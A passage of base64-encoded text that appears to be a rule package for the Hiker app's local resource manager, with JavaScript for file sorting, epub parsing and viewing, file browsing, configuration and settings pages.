IgOiBDb25maWcuZGVmX1BpYztcXG4gICAgICAgIGxldCBuYW1lcz1TdHJpbmcoaXRlbS5nZXROYW1lKCkpLnNwbGl0KFxcXCIkXFxcIik7XFxuICAgICAgICBib29rTGlzdC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogbmFtZXNbMF0sXFxuICAgICAgICAgICAgZGVzYzogbmFtZXNbMV0sXFxuICAgICAgICAgICAgcGljX3VybDogcGljLFxcbiAgICAgICAgICAgIHVybDogdHlwZSA9PT0gXFxcIm5vdmVsXFxcIiA/cGFnZVVybCArIFxcXCI/cnVsZT1cXFwiICsgTVlfUlVMRS50aXRsZTokKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChwYWdlVXJsLCBwYXRoKT0+e1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXCJsb25nUHJlc3MuanNcXFwiKS5zaW5nbGVFbnRlcihwYWdlVXJsLCBwYXRoKTtcXG4gICAgICAgICAgICB9LCBwYWdlVXJsLCBpdGVtLmdldFBhdGgoKSksXFxuICAgICAgICAgICAgY29sX3R5cGU6Y29sX3R5cGUsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLliKDpmaRcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKHBhdGgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXCJsb25nUHJlc3MuanNcXFwiKS5kZWxldGVGaWxlRm9yQm9vayhwYXRoKTtcXG4gICAgICAgICAgICAgICAgICAgIH0sIGl0ZW0uZ2V0UGF0aCgpKVxcbiAgICAgICAgICAgICAgICB9XSxcXG4gICAgICAgICAgICAgICAgaWQ6IGl0ZW0uZ2V0UGF0aCgpLFxcbiAgICAgICAgICAgICAgICBwYXRoOiBpdGVtLmdldFBhdGgoKSxcXG4gICAgICAgICAgICAgICAgbmFtZTogaXRlbS5nZXROYW1lKClcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICBpZiAocmFua0lzUmV2ZXJzZSkge1xcbiAgICAgICAgYm9va0xpc3QucmV2ZXJzZSgpO1xcbiAgICB9XFxuXFxuICAgIHNldFJlc3VsdChsYXlvdXQuY29uY2F0KGJvb2tMaXN0KSk7XFxufSkoKTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiNmLuaWh+S7tuaOkuW6j1wiLFwicGF0aFwiOlwiZmlsZVJhbmsuanNcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcIkZpbGUuanNcXFwiKTtcXG5sZXQgY2huTnVtQ2hhciA9IHtcXG4gICAg6Zu2OiAwLFxcbiAgICDkuIA6IDEsXFxuICAgIOS6jDogMixcXG4gICAg5LiJOiAzLFxcbiAgICDlm5s6IDQsXFxuICAgIOS6lDogNSxcXG4gICAg5YWtOiA2LFxcbiAgICDkuIM6IDcsXFxuICAgIOWFqzogOCxcXG4gICAg5LmdOiA5XFxufTtcXG5cXG5sZXQgY2huTmFtZVZhbHVlID0ge1xcbiAgICDljYE6IHtcXG4gICAgICAgIHZhbHVlOiAxMCxcXG4gICAgICAgIHNlY1VuaXQ6IGZhbHNlXFxuICAgIH0sXFxuICAgIOeZvjoge1xcbiAgICAgICAgdmFsdWU6IDEwMCxcXG4gICAgICAgIHNlY1VuaXQ6IGZhbHNlXFxuICAgIH0sXFxuICAgIOWNgzoge1xcbiAgICAgICAgdmFsdWU6IDEwMDAsXFxuICAgICAgICBzZWNVbml0OiBmYWxzZVxcbiAgICB9LFxcbiAgICDkuIc6IHtcXG4gICAgICAgIHZhbHVlOiAxMDAwMCxcXG4gICAgICAgIHNlY1VuaXQ6IHRydWVcXG4gICAgfSxcXG4gICAg5Lq/OiB7XFxuICAgICAgICB2YWx1ZTogMTAwMDAwMDAwLFxcbiAgICAgICAgc2VjVW5pdDogdHJ1ZVxcbiAgICB9XFxufVxcblxcbmZ1bmN0aW9uIENoaW5lc2VUb051bWJlcihjaG5TdHIpIHtcXG4gICAgbGV0IHJ0biA9IDA7XFxuICAgIGxldCBzZWN0aW9uID0gMDtcXG4gICAgbGV0IG51bWJlciA9IDA7XFxuICAgIGxldCBzZWNVbml0ID0gZmFsc2U7XFxuICAgIGxldCBzdHIgPSBjaG5TdHIuc3BsaXQoJycpO1xcblxcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IG51bSA9IGNobk51bUNoYXJbc3RyW2ldXTtcXG4gICAgICAgIGlmICh0eXBlb2YgbnVtICE9PSAndW5kZWZpbmVkJykge1xcbiAgICAgICAgICAgIG51bWJlciA9IG51bTtcXG4gICAgICAgICAgICBpZiAoaSA9PT0gc3RyLmxlbmd0aCAtIDEpIHtcXG4gICAgICAgICAgICAgICAgc2VjdGlvbiArPSBudW1iZXI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBsZXQgdW5pdCA9IGNobk5hbWVWYWx1ZVtzdHJbaV1dLnZhbHVlO1xcbiAgICAgICAgICAgIHNlY1VuaXQgPSBjaG5OYW1lVmFsdWVbc3RyW2ldXS5zZWNVbml0O1xcbiAgICAgICAgICAgIGlmIChzZWNVbml0KSB7XFxuICAgICAgICAgICAgICAgIHNlY3Rpb24gPSAoc2VjdGlvbiArIG51bWJlcikgKiB1bml0O1xcbiAgICAgICAgICAgICAgICBydG4gKz0gc2VjdGlvbjtcXG4gICAgICAgICAgICAgICAgc2VjdGlvbiA9IDA7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgc2VjdGlvbiArPSAobnVtYmVyICogdW5pdCk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIG51bWJlciA9IDA7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgcmV0dXJuIHJ0biArIHNlY3Rpb247XFxufVxcblxcbmZ1bmN0aW9uIG5hbWVDb21wYXJlKGEsIGIpIHtcXG4gICAgaWYgKGEgPT0gbnVsbCB8fCBiID09IG51bGwpXFxuICAgICAgICByZXR1cm4gYSA9PSBudWxsID8gYiA9PSBudWxsID8gMCA6IC0xIDogMTtcXG5cXG4gICAgYSA9IGEucmVwbGFjZSgvKFvpm7bkuIDkuozkuInlm5vkupTlha3kuIPlhavkuZ3ljYHnmb7ljYPkuIfkur9dKS9nLCBmdW5jdGlvbihtYXRjaCwgcDEsIHAyLCBwMywgb2Zmc2V0LCBzdHJpbmcpIHtcXG4gICAgICAgIC8vIHAxIGlzIG5vbmRpZ2l0cywgcDIgZGlnaXRzLCBhbmQgcDMgbm9uLWFscGhhbnVtZXJpY3NcXG4gICAgICAgIHJldHVybiBDaGluZXNlVG9OdW1iZXIocDEpO1xcbiAgICB9KVxcbiAgICBiID0gYi5yZXBsYWNlKC8oW+mbtuS4gOS6jOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+S6v10pL2csIGZ1bmN0aW9uKG1hdGNoLCBwMSwgcDIsIHAzLCBvZmZzZXQsIHN0cmluZykge1xcbiAgICAgICAgLy8gcDEgaXMgbm9uZGlnaXRzLCBwMiBkaWdpdHMsIGFuZCBwMyBub24tYWxwaGFudW1lcmljc1xcbiAgICAgICAgcmV0dXJuIENoaW5lc2VUb051bWJlcihwMSk7XFxuICAgIH0pXFxuXFxuICAgIGxldCBOVU1CRVJTID0gamF2YS51dGlsLnJlZ2V4LlBhdHRlcm4uY29tcGlsZShcXFwiKD88PVxcXFxcXFxcRCkoPz1cXFxcXFxcXGQpfCg/PD1cXFxcXFxcXGQpKD89XFxcXFxcXFxEKVxcXCIpO1xcbiAgICBsZXQgc3BsaXQxID0gTlVNQkVSUy5zcGxpdChuZXcgamF2YS5sYW5nLlN0cmluZyhhKSk7XFxuICAgIGxldCBzcGxpdDIgPSBOVU1CRVJTLnNwbGl0KG5ldyBqYXZhLmxhbmcuU3RyaW5nKGIpKTtcXG5cXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBNYXRoLm1pbihzcGxpdDEubGVuZ3RoLCBzcGxpdDIubGVuZ3RoKTsgaSsrKSB7XFxuICAgICAgICBsZXQgYzEgPSBzcGxpdDFbaV0uY2hhckNvZGVBdCgwKTtcXG4gICAgICAgIGxldCBjMiA9IHNwbGl0MltpXS5jaGFyQ29kZUF0KDApO1xcbiAgICAgICAgbGV0IGNtcCA9IDA7XFxuICAgICAgICBsZXQgemVyb0NoYXJDb2RlID0gJzAnLmNoYXJDb2RlQXQoMCk7XFxuICAgICAgICBsZXQgbmluZUNoYXJDb2RlID0gJzknLmNoYXJDb2RlQXQoMCk7XFxuXFxuICAgICAgICBpZiAoYzEgPj0gemVyb0NoYXJDb2RlICYmIGMxIDw9IG5pbmVDaGFyQ29kZSAmJiBjMiA+PSB6ZXJvQ2hhckNvZGUgJiYgYzIgPD0gbmluZUNoYXJDb2RlKSB7XFxuICAgICAgICAgICAgY21wID0gbmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKHNwbGl0MVtpXSkuY29tcGFyZVRvKG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcihzcGxpdDJbaV0pKTtcXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGlmIChjbXAgPT09IDApIHtcXG4gICAgICAgICAgICBsZXQgcmVnZXggPSAvW2EtekEtWjAtOV0vXFxuICAgICAgICAgICAgbGV0IHMxID0gU3RyaW5nKHNwbGl0MVtpXSlcXG4gICAgICAgICAgICBsZXQgczIgPSBTdHJpbmcoc3BsaXQyW2ldKVxcbiAgICAgICAgICAgIGlmIChyZWdleC50ZXN0KHMxKSB8fCByZWdleC50ZXN0KHMyKSkge1xcbiAgICAgICAgICAgICAgICBjbXAgPSBuZXcgamF2YS5sYW5nLlN0cmluZyhzcGxpdDFbaV0pLmNvbXBhcmVUbyhuZXcgamF2YS5sYW5nLlN0cmluZyhzcGxpdDJbaV0pKTtcXG4gICAgICAgICAgICAgICAgLy8gY21wID0gczEubG9jYWxlQ29tcGFyZShzMiwgJ2VuJylcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBjbXAgPSBzMS5sb2NhbGVDb21wYXJlKHMyLCAnemgnKVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGlmIChjbXAgIT09IDApIHtcXG4gICAgICAgICAgICByZXR1cm4gY21wO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIGxldCBsZW5ndGhDbXAgPSBzcGxpdDEubGVuZ3RoIC0gc3BsaXQyLmxlbmd0aDtcXG4gICAgLy8gaWYgKGxlbmd0aENtcCAhPT0gMCkgbGVuZ3RoQ21wID0gbGVuZ3RoQ21wID4gMCA/IC0xIDogMTtcXG4gICAgcmV0dXJuIGxlbmd0aENtcDtcXG59XFxuXFxuZnVuY3Rpb24gcmFuayhsaXN0LCBtKSB7XFxuICAgIHN3aXRjaCAobSkge1xcbiAgICAgICAgY2FzZSBcXFwidHlwZVxcXCI6XFxuICAgICAgICAgICAgcmV0dXJuIGxpc3Q7XFxuICAgICAgICBjYXNlIFxcXCJuYW1lXFxcIjpcXG4gICAgICAgICAgICByZXR1cm4gbGlzdC5zb3J0KChhLCBiKSA9PiBuYW1lQ29tcGFyZShTdHJpbmcoYS5nZXROYW1lKCkpLCBTdHJpbmcoYi5nZXROYW1lKCkpKSk7XFxuICAgICAgICBjYXNlIFxcXCJzaXplXFxcIjpcXG4gICAgICAgICAgICByZXR1cm4gbGlzdC5zb3J0KChhLCBiKSA9PiBGaWxlLmdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcihhKSAtIEZpbGUuZ2V0VG90YWxTaXplT2ZGaWxlc0luRGlyKGIpKTtcXG4gICAgICAgIGNhc2UgXFxcInRpbWVcXFwiOlxcbiAgICAgICAgICAgIHJldHVybiBsaXN0LnNvcnQoKGEsIGIpID0+IGEubGFzdE1vZGlmaWVkKCkgLSBiLmxhc3RNb2RpZmllZCgpKTtcXG4gICAgICAgIGRlZmF1bHQ6XFxuICAgICAgICAgICAgcmV0dXJuIGxpc3Q7XFxuICAgIH1cXG5cXG59XFxuJC5leHBvcnRzPXJhbms7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi5lcHVi6Kej5p6Q5ZmoXCIsXCJwYXRoXCI6XCJlcHViUGFyc2VyLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbnZhciBsYXlvdXQgPSBbXTtcXG5zZXRQYWdlVGl0bGUoXFxcIuS5puexjeS/oeaBr1xcXCIpO1xcbmxldCBwYXRoID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJwYXRoXFxcIikgfHwgXFxcIlxcXCIpIHx8IE1ZX1BBUkFNUy5wYXRoO1xcbmxldCBtZXRhID0gZ2V0RXB1Yk1ldGFkYXRhKHBhdGgpO1xcbi8vbG9nKG1ldGEpXFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogbWV0YS5maXJzdFRpdGxlLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICB9XFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIvCfkaTkvZzogIXvvJpcXFwiICsgbWV0YS5hdXRob3JzWzBdLmxhc3RuYW1lLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCIsXFxufSk7XFxubGV0IGRlc2NyaXB0aW9uID0gKG1ldGEuZGVzY3JpcHRpb25zWzBdIHx8IFxcXCJcXFwiKS5yZXBsYWNlKC88cC4qPz58PFxcXFwvcD4vZywgXFxcIlxcXCIpO1xcbmxldCB0ZGVzY3JpcHRpb24gPSBkZXNjcmlwdGlvbjtcXG5pZiAoZGVzY3JpcHRpb24pIHtcXG4gICAgXFxuICAgIGlmIChkZXNjcmlwdGlvbi5sZW5ndGggPiA1MCkge1xcbiAgICAgICAgZGVzY3JpcHRpb24gPSBkZXNjcmlwdGlvbi5zdWJzdHJpbmcoMCwgNTApICtcXFwiLi4uLi4uXFxcIiArXFxcIuabtOWkmj5cXFwiLmxpbmsoJCgpLmI2NChcXFwiJ1xcXCIpLnJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIHNldFBhZ2VUaXRsZShcXFwi566A5LuLXFxcIik7XFxuICAgICAgICAgICAgc2V0UmVzdWx0KFt7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi566A5LuL77yaPGJyPuOAgOOAgFxcXCIgKyBNWV9QQVJBTVMudGV4dCxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcblxcbiAgICAgICAgICAgIH1dKTtcXG4gICAgICAgIH0pKTtcXG4gICAgfVxcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIvCfk53nroDku4vvvJo8YnI+44CA44CAXFxcIitkZXNjcmlwdGlvbixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgdGV4dDogdGRlc2NyaXB0aW9uXFxuICAgICAgICB9XFxuICAgIH0pO1xcbn1cXG4vL3NldFBhZ2VUaXRsZShtZXRhLmZpcnN0VGl0bGUpO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG59KTtcXG5sZXQgY2hhcHRlcnMgPSBnZXRFcHViQ2hhcHRlcnMocGF0aCk7XFxuZm9yIChsZXQgaXQgb2YgY2hhcHRlcnMpIHtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IGl0LnRpdGxlLFxcbiAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2VwdWJWaWV3ZXIudmlldyNyZWFkVGhlbWUjI2F1dG9QYWdlI1xcXCIsXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGhyZWY6IGl0LnVybCxcXG4gICAgICAgICAgICBwYXRoOiBwYXRoLFxcbiAgICAgICAgICAgIHRpdGxlOiBpdC50aXRsZVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG59XFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi5lcHVi5p+l55yL5ZmoXCIsXCJwYXRoXCI6XCJlcHViVmlld2VyLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmxldCBwYXRoID0gTVlfUEFSQU1TLnBhdGg7XFxubGV0IHVybCA9IE1ZX1BBUkFNUy5ocmVmO1xcbmxldCBjID0gZ2V0RXB1YkNvbnRlbnQocGF0aCwgdXJsKTtcXG4vL2xldCBhPSBjLnJlcGxhY2UoL1xcXFxzPzxkaXYuKj8+fDxcXFxcL2Rpdj5cXFxccz8vZywgXFxcIlxcXCIpLnJlcGxhY2UoL1xcXFxzPzxwLio/PiguKik8XFxcXC9wPlxcXFxzPy9nLCBcXFwiXFxcXHUzMDAwXFxcXHUzMDAwJDE8YnI+XFxcIik7XFxuLy9sZXQgYj1jLnJlcGxhY2UoL1xcXFxzPzxkaXYuKj8+fDxcXFxcL2Rpdj5cXFxccz8vZywgXFxcIlxcXCIpLnJlcGxhY2UoL1xcXFxzPzxwLio/PiguKj8pPFxcXFwvcD5cXFxccz8vZywgXFxcIlxcXFx1MzAwMFxcXFx1MzAwMCQxPGJyPlxcXCIpO1xcbi8vbG9nKGE9PWIpXFxuLy9sb2coZ2V0RXB1YkNvbnRlbnQwKHBhdGgsIHVybCkpXFxuXFxubGV0IGxheW91dCA9IFtdO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcbiAgICB0aXRsZTogKFxcXCI8c3Ryb25nPlxcXCIgKyBNWV9QQVJBTVMudGl0bGUgKyBcXFwiPC9zdHJvbmc+XFxcIikuYmlnKCksXFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogYyxcXG4gICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdGV4dFNpemU6IDE4LFxcbiAgICAgICAgY2xpY2s6IHRydWVcXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChsYXlvdXQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3bmlofku7bnrqHnkIZcIixcInBhdGhcIjpcIkZpbGVNYW5hZ2VtZW50LnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbmxldCB1cmwgPSBcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXCI7XFxubGV0IGYgPSAkLnJlcXVpcmUodXJsKTtcXG5sZXQgdHlwZSA9IGdldFBhcmFtKFxcXCJ0eXBlXFxcIiwgXFxcImhvbWVQYXRoXFxcIik7XFxuYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAoKSA9PiB7XFxuICAgIHJlZnJlc2hQYWdlKCk7XFxufSk7XFxubGV0IGhpa2VyUGF0aCA9IFxcXCJmaWxlOi8vXFxcIiArIENvbmZpZy5ob21lUGF0aDtcXG5pZighZmlsZUV4aXN0KGhpa2VyUGF0aCkpe1xcbiAgICB3cml0ZUZpbGUoaGlrZXJQYXRoK1xcXCIv5Yib5bu655uu5b2VLnR4dFxcXCIsXFxcIlxcXCIpO1xcbiAgICBkZWxldGVGaWxlKGhpa2VyUGF0aCtcXFwiL+WIm+W7uuebruW9lS50eHRcXFwiKTtcXG59XFxuZi5maWxlU2VsZWN0aW9uKHtcXG4gICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgLy/moLnmja7mlofku7bmianlsZXlkI3vvIznlKjkuI3lkIzlsI/nqIvluo/miZPlvIBcXG4gICAgICAgIGlmIChcXFwiLmpwZ1xcXCIgPT09IFRZUEUpIHtcXG4gICAgICAgICAgICByZXR1cm4gUEFUSDtcXG4gICAgICAgIH0gZWxzZSBpZiAoXFxcIi50eHRcXFwiID09PSBUWVBFKSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvdHh0UGFyc2VyLnZpZXc/aXNDYWNoZT10cnVlJnJ1bGU9XFxcIiArIE1ZX1JVTEUudGl0bGUgKyBcXFwiJnBhdGg9XFxcIiArIFBBVEg7XFxuICAgICAgICB9IGVsc2UgaWYgKFxcXCIuZXB1YlxcXCIgPT09IFRZUEUpIHtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9lcHViUGFyc2VyLnZpZXcjYXV0b0NhY2hlIz9ydWxlPVxcXCIgKyBNWV9SVUxFLnRpdGxlICsgXFxcIiZwYXRoPVxcXCIgKyBQQVRIO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICByZXR1cm4gJChcXFwi5peg5rOV5omT5byA77yM5piv5ZCm5L2/55So5YW25LuW5bqU55So5omT5byA77yfXFxcIikuY29uZmlybShwYXRoID0+IFxcXCJvcGVuRmlsZTovL2ZpbGU6Ly9cXFwiICsgcGF0aCwgUEFUSCk7XFxuICAgICAgICB9XFxuICAgIH0pLFxcbiAgICBpbml0aWFsUGF0aDogQ29uZmlnW3R5cGVdLFxcbiAgICByb290RGlyUGF0aDogQ29uZmlnLmhvbWVQYXRoLFxcbiAgICAvL29uQ2xpY2tUeXBlOiBcXFwiY29uZmlybVxcXCIsXFxuICAgIC8vbWVtb3J5OiBcXFwiRmlsZU1hbmFnZW1lbnQ6bWVtb3J5XFxcIixcXG4gICAgZmlsZVR5cGU6IFxcXCJcXFxcLnR4dHxcXFxcLmVwdWJ8LmpwZ1xcXCIsXFxuICAgIC8vY0hvbWVUaXBzOiBcXFwi5piv5ZCm5L2/55So5rW36ZiU5bCP56iL5bqP5omT5byAWyR7bmFtZX1dP1xcXCIsXFxuICAgIC8vY1NlYXJjaFRpcHM6IFxcXCLmmK/lkKbkvb/nlKjmtbfpmJTlsI/nqIvluo/miZPlvIBbJHtwYXRofV0/XFxcIlxcbn0pO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI2ouQ29uZmlnXCIsXCJwYXRoXCI6XCJDb25maWcuanNcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzP3J1bGU95pys5Zyw6LWE5rqQ566h55CGXFxcIik7XFxuXFxubGV0IGxvY2FsQ29uZmlnID0ge307XFxuXFxudHJ5IHtcXG4gICAgbG9jYWxDb25maWcgPSBKU09OLnBhcnNlKEZpbGUucmVhZEZpbGUoZ2V0UGF0aChcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9maWxlcy/mnKzlnLDotYTmupDnrqHnkIYvY29uZmlnLmpzb25cXFwiKS5zbGljZSg3KSkpO1xcbn0gY2F0Y2ggKGUpIHtcXG4gICAgZGVsZXRlRmlsZShcXFwiY29uZmlnLmpzb25cXFwiKTtcXG59XFxuY29uc3QgQ29uZmlnID0gT2JqZWN0LmFzc2lnbih7XFxuICAgIGhvbWVQYXRoOiBnZXRQYXRoKFxcXCJoaWtlcjovL2ZpbGVzL2xvY2FsTWFuYWdlclxcXCIpLnNsaWNlKDcpLFxcbiAgICBsb2dOdW06IDEwLFxcbiAgICB0aHJlYWROdW06IDAsXFxuICAgIGRlZl9pc1BhZ2luYXRlOiBcXFwiMVxcXCIsIC8vMem7mOiupOW8gOWQr+WIhumhte+8jDDpu5jorqTlhbPpl61cXG4gICAgdmlld1BhZ2VTaXplOiAyMDAsXFxuICAgIGRlZl9QaWM6IFxcXCJoaWtlcjovL2ltYWdlcy9ob21lX3BpYzRcXFwiLFxcbiAgICBkZWZfTG9yZF9UeXBlOiBcXFwiY29taWNcXFwiLFxcbiAgICBkZWZfVmlld19TdHlsZTogXFxcInRleHRfMVxcXCIsXFxuICAgIGRlZl9Eb1ZpX1N0eWxlOiBcXFwidGV4dF8yXFxcIixcXG4gICAgZGVmX0RvVmlfVHlwZTogXFxcIjFcXFwiLCAvLzDlhajpg6gsIDHmnKrlrozmiJDvvIwy5bey5a6M5oiQXFxuICAgIGRlZl9pc0NvbWljQ29tcGF0aWJsZTogXFxcIjBcXFwiLFxcbiAgICBkZWZfQ29taWNfU3R5bGU6IFxcXCJ0ZXh0XzFcXFwiXFxufSwgbG9jYWxDb25maWcpO1xcbmNvbnN0IFBBVEhTID0ge1xcbiAgICBub3ZlbFBhdGg6IFxcXCIv5bCP6K+0L1xcXCIsXFxuICAgIGNvbWljUGF0aDogXFxcIi/mvKvnlLsvXFxcIixcXG4gICAgbm92ZWxGdWxsUGF0aDogXFxcIi/lsI/or7TlkIjlubYvXFxcIixcXG4gICAgZXh0ZXJuYWxJbXBvcnRQYXRoOiBcXFwiL+WkluWvvOWwj+ivtC9cXFwiLFxcbiAgICBjb250ZW50c0NhY2hlOiBcXFwiL+ebruW9lee8k+WtmC9cXFwiXFxufVxcblxcblxcbk9iamVjdC5rZXlzKFBBVEhTKS5mb3JFYWNoKGtleSA9PiBDb25maWdba2V5XSA9IENvbmZpZy5ob21lUGF0aCArIFBBVEhTW2tleV0pO1xcblxcbiQuZXhwb3J0cyA9IENvbmZpZztcIn1dLFwicGFyYW1zXCI6XCJ7XFxcInZlcnNpb25cXFwiOjEwNH1cIixcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5pys5Zyw6LWE5rqQ566h55CGXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9wYWdlL1NldHRpbmcudmlldyNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5I1wiLFwiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcImZpbmRfcnVsZVwiOlwianM6XFxuc2V0UGFnZVRpdGxlKE1ZX1JVTEUudGl0bGUgKyBcXFwifOiuvue9rlxcXCIpO1xcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcblxcbmxldCBsYXlvdXQgPSBbXTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiPHN0cm9uZz7ln7rnoYDorr7nva48L3N0cm9uZz5cXFwiLmJpZygpLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCJcXG59KTtcXG5cXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi55uu5b2V6Lev5b6EXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL1NldHRpbmcvTW9yZS52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjP3NldHRpbmdUeXBlPWNvbnRlbnRzXFxcIixcXG4gICAgZGVzYzogQ29uZmlnLmhvbWVQYXRoLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi6K6+572u6buY6K6k5bCB6Z2iXFxcIixcXG4gICAgZGVzYzogQ29uZmlnLmRlZl9QaWMsXFxuICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nL01vcmUudmlldyNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9zZXR0aW5nVHlwZT1kZWZhdWx0UGljXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgIH1cXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG59KTtcXG5sYXlvdXQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiPHN0cm9uZz7kuIvovb3lmajorr7nva48L3N0cm9uZz5cXFwiLmJpZygpLFxcbiAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG59KTtcXG5sYXlvd